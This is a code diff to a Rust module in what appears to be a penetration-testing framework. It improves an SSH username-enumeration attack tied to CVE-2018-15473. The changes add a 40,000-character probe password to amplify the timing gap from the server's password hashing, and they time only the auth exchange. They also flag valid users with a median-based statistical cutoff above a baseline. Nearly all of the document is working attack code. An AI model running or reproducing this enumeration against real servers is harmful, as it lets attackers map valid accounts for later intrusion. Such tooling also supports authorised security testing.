@@ -30,8 +30,20 @@ pub fn info() -> crate::module_info::ModuleInfo {
 
 const DEFAULT_SSH_PORT: u16 = 22;
 const DEFAULT_TIMEOUT_SECS: u64 = 10;
-const DEFAULT_SAMPLES: usize = 3;
-const TIMING_THRESHOLD: f64 = 0.3; // 300ms difference threshold
+const DEFAULT_SAMPLES: usize = 5;
+/// Cutoff in BASELINE STANDARD DEVIATIONS (not seconds): a username is flagged
+/// when its median auth time exceeds baseline_mean + THRESHOLD*stddev. A fixed
+/// 300 ms absolute threshold was all-valid on a WAN and all-invalid on a LAN.
+const TIMING_THRESHOLD: f64 = 3.0;
+/// Baseline needs more samples than a per-user run for a stable mean + stddev.
+const BASELINE_SAMPLES: usize = 12;
+/// Absolute floor (seconds) added to the sigma cutoff so a near-zero baseline
+/// stddev on a quiet LAN can't produce a hair-trigger that flags every user.
+const MIN_ABS_DELTA: f64 = 0.02;
+/// CVE-2018-15473 timing relies on the server running its password KDF only for
+/// VALID users; a long password makes that work dominate the measured time while
+/// invalid users are rejected cheaply, amplifying the signal.
+const PROBE_PASSWORD_LEN: usize = 40_000;
 
 fn display_banner() {
     if crate::utils::is_batch_mode() { return; }
@@ -90,8 +102,6 @@ fn normalize_target(target: &str) -> String {
 fn time_auth_attempt(host: &str, port: u16, username: &str, timeout_secs: u64) -> Option<f64> {
     let addr = format!("{}:{}", host, port);
 
-    let start = Instant::now();
-
     let tcp = match crate::utils::blocking_tcp_connect(
         &addr.parse().ok()?,
         Duration::from_secs(timeout_secs),
@@ -120,30 +130,27 @@ fn time_auth_attempt(host: &str, port: u16, username: &str, timeout_secs: u64) -
         return None;
     }
 
-    // Try authentication with invalid password
-    let invalid_password = format!(
-        "invalid_{}_{}",
-        std::process::id(),
-        start.elapsed().as_nanos()
-    );
-    if let Err(e) = sess.userauth_password(username, &invalid_password) {
+    // Time ONLY the auth exchange. Starting the clock before connect/KEX/DH
+    // keygen (as before) swamped the auth-decision delta with network + handshake
+    // noise. The long password makes the server's KDF — run only for VALID users
+    // on vulnerable OpenSSH — dominate the measurement.
+    let probe_password = "A".repeat(PROBE_PASSWORD_LEN);
+    let start = Instant::now();
+    if let Err(e) = sess.userauth_password(username, &probe_password) {
         tracing::trace!("Auth attempt for '{}' returned error (expected): {}", username, e);
     }
-
-    let elapsed = start.elapsed().as_secs_f64();
-    Some(elapsed)
+    Some(start.elapsed().as_secs_f64())
 }
 
-/// Sample authentication timing for a username
-fn sample_auth_timing(
+/// Collect raw per-attempt auth timings for a username (empty if unreachable).
+fn collect_samples(
     host: &str,
     port: u16,
     username: &str,
     samples: usize,
     timeout_secs: u64,
-) -> Option<f64> {
+) -> Vec<f64> {
     let mut times = Vec::new();
-
     for _ in 0..samples {
         if let Some(t) = time_auth_attempt(host, port, username, timeout_secs) {
             times.push(t);
@@ -151,13 +158,38 @@ fn sample_auth_timing(
         // Small delay between samples
         std::thread::sleep(Duration::from_millis(100));
     }
+    times
+}
 
-    if times.is_empty() {
-        return None;
+fn mean(xs: &[f64]) -> f64 {
+    if xs.is_empty() {
+        return 0.0;
     }
+    xs.iter().sum::<f64>() / xs.len() as f64
+}
 
-    // Return average
-    Some(times.iter().sum::<f64>() / times.len() as f64)
+/// Sample standard deviation (n-1). Zero for fewer than two samples.
+fn stddev(xs: &[f64], mean: f64) -> f64 {
+    if xs.len() < 2 {
+        return 0.0;
+    }
+    let var = xs.iter().map(|x| (x - mean).powi(2)).sum::<f64>() / (xs.len() as f64 - 1.0);
+    var.sqrt()
+}
+
+/// Median — robust to the occasional GC/scheduler outlier that skews a mean.
+fn median(xs: &[f64]) -> f64 {
+    if xs.is_empty() {
+        return 0.0;
+    }
+    let mut s = xs.to_vec();
+    s.sort_by(|a, b| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal));
+    let mid = s.len() / 2;
+    if s.len() % 2 == 1 {
+        s[mid]
+    } else {
+        (s[mid - 1] + s[mid]) / 2.0
+    }
 }
 
 /// Load usernames from file
@@ -202,7 +234,7 @@ pub async fn enumerate_users(
     );
     crate::mprintln!(
         "{}",
-        format!("[*] Timing threshold: {:.3}s", threshold).cyan()
+        format!("[*] Detection cutoff: {:.1} sigma above baseline", threshold).cyan()
     );
     crate::mprintln!();
 
@@ -241,19 +273,32 @@ fn enumerate_users_blocking(
     );
     crate::mprintln!("{}", "[*] Establishing baseline timing...".cyan());
 
-    let baseline = match sample_auth_timing(host, port, &baseline_user, samples, timeout_secs) {
-        Some(t) => {
-            crate::mprintln!("{}", format!("[*] Baseline timing: {:.3}s", t).cyan());
-            t
-        }
-        None => {
-            crate::mprintln!(
-                "{}",
-                "[-] Failed to establish baseline - cannot reach target".red()
-            );
-            return Vec::new();
-        }
-    };
+    // Baseline from MANY invalid-user samples → mean + stddev for a statistical
+    // (not fixed-millisecond) cutoff.
+    let baseline_samples =
+        collect_samples(host, port, &baseline_user, samples.max(BASELINE_SAMPLES), timeout_secs);
+    if baseline_samples.is_empty() {
+        crate::mprintln!(
+            "{}",
+            "[-] Failed to establish baseline - cannot reach target".red()
+        );
+        return Vec::new();
+    }
+    let baseline_mean = mean(&baseline_samples);
+    let baseline_sd = stddev(&baseline_samples, baseline_mean);
+    // One-sided cutoff: valid users are SLOWER (the server runs its KDF), so we
+    // flag only medians ABOVE the cutoff — the old `diff.abs()` also flagged
+    // faster-than-baseline users, which is backwards. `threshold` is a sigma
+    // multiplier; MIN_ABS_DELTA floors it when the baseline stddev is ~0.
+    let cutoff = baseline_mean + (threshold * baseline_sd).max(MIN_ABS_DELTA);
+    crate::mprintln!(
+        "{}",
+        format!(
+            "[*] Baseline: mean {:.3}s, stddev {:.3}s → cutoff {:.3}s",
+            baseline_mean, baseline_sd, cutoff
+        )
+        .cyan()
+    );
 
     crate::mprintln!();
     crate::mprintln!("{}", "[*] Testing usernames...".cyan());
@@ -269,20 +314,23 @@ fn enumerate_users_blocking(
         );
         if let Err(e) = std::io::Write::flush(&mut std::io::stdout()) { eprintln!("[!] Flush failed: {}", e); }
 
-        match sample_auth_timing(host, port, user, samples, timeout_secs) {
-            Some(t) => {
-                let diff = t - baseline;
-                if diff.abs() > threshold {
-                    crate::mprintln!(
-                        "\r{}",
-                        format!("[+] Valid user: {} (timing diff: {:+.3}s)", user, diff).green()
-                    );
-                    valid_users.push(user.clone());
-                }
-            }
-            None => {
-                // Connection failed, skip
-            }
+        let user_samples = collect_samples(host, port, user, samples, timeout_secs);
+        if user_samples.is_empty() {
+            continue; // unreachable this round — skip
+        }
+        let user_median = median(&user_samples);
+        if user_median > cutoff {
+            crate::mprintln!(
+                "\r{}",
+                format!(
+                    "[+] Valid user: {} (median {:.3}s, +{:.3}s over baseline)",
+                    user,
+                    user_median,
+                    user_median - baseline_mean
+                )
+                .green()
+            );
+            valid_users.push(user.clone());
         }
     }
 
@@ -329,7 +377,7 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
         .await?
         .parse()
         .unwrap_or(DEFAULT_SSH_PORT);
-    let samples: usize = cfg_prompt_default("samples", "Samples per username", "3")
+    let samples: usize = cfg_prompt_default("samples", "Samples per username", "5")
         .await?
         .parse()
         .unwrap_or(DEFAULT_SAMPLES);
@@ -337,7 +385,7 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
         .await?
         .parse()
         .unwrap_or(DEFAULT_TIMEOUT_SECS);
-    let threshold: f64 = cfg_prompt_default("threshold", "Timing threshold (seconds)", "0.3")
+    let threshold: f64 = cfg_prompt_default("threshold", "Detection cutoff (baseline std-devs)", "3.0")
         .await?
         .parse()
         .unwrap_or(TIMING_THRESHOLD);
